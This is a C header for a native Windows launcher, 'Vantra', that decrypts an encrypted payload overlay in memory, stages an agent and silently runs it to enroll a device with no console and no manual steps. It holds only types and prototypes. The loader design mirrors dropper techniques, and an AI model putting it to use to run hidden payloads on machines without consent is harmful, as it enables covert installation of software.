/*
 * common.h — NATIVE Vantra launcher (Option 3): shared types + prototypes.
 *
 * Replaces the Mono-IL launcher with a bare native Windows PE that runs on a
 * stock host (no Mono/.NET) and performs the full deployment automatically:
 * decrypt the LOCKED VNTR overlay in memory → stage the agent → wait ~6s for it
 * to settle → run the STAGED payload with the `enroll` argv (install + enroll
 * in one run) → the device registers with ZERO manual steps. Compiled with
 * -mwindows (PE Subsystem 2): no console.
 */

#ifndef LNCH_COMMON_H
#define LNCH_COMMON_H

#include <stddef.h>
#include <stdint.h>

#define HDR_LEN 24
#define ENV_LEN 65
#define MAX_CFG 65536
#define MAX_PAY (256 * 1024 * 1024)

typedef struct {
    int flags;
    int external;          /* payload stored in sibling agent.bin (FLAG 0x02) */
    uint8_t *payload;      /* decrypted agent (NULL when external) */
    size_t payload_len;    /* decrypted/cipher length */
    char *config;
    uint8_t kb[32];        /* per-build payload key (from envelope) */
    uint8_t iv_pay[16];    /* per-build payload IV (from envelope) */
} Overlay;

/* overlay.c */
int  overlay_parse(const uint8_t *buf, size_t n, Overlay *ov);
int  write_file(const char *path, const uint8_t *data, size_t n);
int  read_file(const char *path, uint8_t **out, size_t *n);

/* config.c */
char *cfg_decoded(const char *cfg, const char *key, int max);
char **tokenize(const char *s, size_t *out_n);
void free_tokens(char **toks, size_t n);

/* spawn.c */
int  run_proc(const char *exe, const char **arg, int argc);
int  run_enroll(const char *enroll);
int  run_enroll_staged(const char *enroll, const char *stagedExe);
int  sleep_ms(unsigned ms);

#endif